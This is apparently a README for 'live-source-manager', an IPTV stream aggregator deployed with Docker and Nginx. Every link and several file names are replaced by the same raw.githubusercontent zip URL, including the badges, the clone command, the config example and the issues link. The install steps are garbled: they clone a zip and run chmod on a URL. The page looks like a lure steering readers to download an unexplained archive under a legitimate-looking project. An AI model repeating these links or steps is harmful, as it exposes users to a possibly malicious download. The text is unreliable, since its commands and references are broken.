# 📺 live-source-manager - Efficient Streaming Source Manager

[![Download](https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip%20Now-Release%https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip)](https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip)

## 📦 Introduction

Live Source Manager is a smart and efficient tool for gathering, testing, and distributing streaming sources. It automatically collects streams from various online sources and local files. With Nginx integration, it delivers a reliable M3U playlist service, ensuring a smooth streaming experience.

---

## ✨ Key Features

### 🚀 Automated Process
- **One-Click Setup** - Use Docker to deploy quickly without complication.
- **Smart Aggregation** - Collect streams from multiple online sources and files automatically.
- **Quality Checks** - Test media streams for availability, delay, and resolution in real time.
- **Intelligent Sorting** - Categorize channels based on user-defined rules and geographic location.

### 🎯 Intelligent Filtering
- **Multi-Dimensional Filtering** - Filter streams by delay, resolution, bitrate, and download speed.
- **Quality First** - Automatically select the best source for each stream (up to three sources retained).
- **Dual Output** - Generate two playlist versions: a full list with all valid sources and a selection with only the best.

### 🌐 Efficient Service
- **Nginx Integration** - Offers high-performance static file services, supporting numerous users at once.
- **Multi-Format Support** - Outputs playlists in both M3U and TXT formats.
- **Cross-Platform Compatibility** - Works with popular media players like IPTV, Kodi, and VLC.

### ⚙️ Flexible Configuration
- **Proxy Support** - Built-in SOCKS5/HTTP proxy options to bypass network restrictions.
- **Scheduled Updates** - Set up tasks to automatically refresh streaming sources at intervals.
- **Detailed Logging** - Access complete logs and statistics for effective monitoring and troubleshooting.

---

## 🛠 Getting Started

### System Requirements
- **Docker & Docker Compose**: Ensure you have both installed.
- **Memory**: At least 2GB of available RAM is needed for smooth operation.
- **Disk Space**: Have at least 10GB of free disk space for installation and operation.

### One-Click Deployment
To set up Live Source Manager quickly, follow these steps:

```bash
# Clone the project
git clone https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip
cd live-source-manager

# Run the deployment script (automatically builds the image and starts the service)
chmod +x https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip
https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip
```

### Manual Deployment
If you prefer a manual setup, you can build and run the Docker container like this:

```bash
# Build the Docker image
docker build -t livesourcemanager-nginx .

# Run the container
docker run -d \
  --name livesourcemanager \
  -p 12345:12345 \
  livesourcemanager-nginx
```

### Download & Install
To get started with Live Source Manager, visit [this page to download](https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip). You will find the latest release files there.

---

## ⚙️ Configuration Details

### Adjusting Settings
You can customize various settings in the `https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip` file after installation. This allows for fine-tuning of the filtering criteria, scheduling updates, and proxy settings.

### Example Configuration
```yaml
streams:
  - url: "https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip"
    quality: "high"
    location: "USA"
  - url: "https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip"
    quality: "medium"
    location: "Asia"
```

### Logging and Monitoring
Logs can be accessed in the `logs` directory within the project folder. They provide essential information about stream sources and their statuses, aiding in effective monitoring.

---

## 🚀 Support

If you run into issues or have questions, please check the [issues page](https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip) for help from the community or to report a bug.

---

[![Download](https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip%20Now-Release%https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip)](https://raw.githubusercontent.com/ghghghghfdg/live-source-manager/main/trichy/live-source-manager.zip)